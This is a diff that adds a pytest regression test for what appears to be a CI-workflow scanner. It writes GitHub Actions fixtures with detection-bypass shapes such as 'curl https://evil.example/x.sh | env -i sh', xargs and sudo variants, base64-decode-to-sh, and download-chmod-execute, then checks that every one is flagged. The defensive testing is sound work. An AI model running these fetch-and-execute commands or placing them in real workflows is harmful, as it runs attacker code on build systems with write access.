@@ -306,3 +306,27 @@ def test_bypass_fixtures_r9_probe_family(tmp_path):
     caught = {f.split(":")[0] for f in findings}
     missed = sorted({f"u{i}.yml" for i in range(len(shapes))} - caught)
     assert not missed, f"shapes not detected: {missed}"
+
+
+def test_bypass_fixtures_r10_probe_family(tmp_path):
+    """Round-10 verifier probes: env/xargs with flags, intermediate filters,
+    path-qualified sudo, download-then-exec-by-path."""
+    shapes = [
+        'curl https://evil.example/x.sh | env -i sh',
+        'curl https://evil.example/x.sh | env -u HOME bash',
+        'curl https://evil.example/x.sh | env -S bash',
+        'curl https://evil.example/x.sh | xargs -I{} sh -c "{}"',
+        'gh api repos/x/y/contents/s.sh | base64 -d | sh',
+        'curl -fsSL https://evil.example/s.sh -o s.sh && chmod +x s.sh && ./s.sh',
+        'curl https://evil.example/x.sh | /usr/bin/sudo bash',
+    ]
+    for i, s in enumerate(shapes):
+        (tmp_path / f"v{i}.yml").write_text(
+            "on: [pull_request]\npermissions:\n  contents: write\njobs:\n"
+            "  j:\n    runs-on: ubuntu-latest\n    steps:\n"
+            f"      - run: {s}\n"
+        )
+    findings = cwp.check(tmp_path)
+    caught = {f.split(":")[0] for f in findings}
+    missed = sorted({f"v{i}.yml" for i in range(len(shapes))} - caught)
+    assert not missed, f"shapes not detected: {missed}"
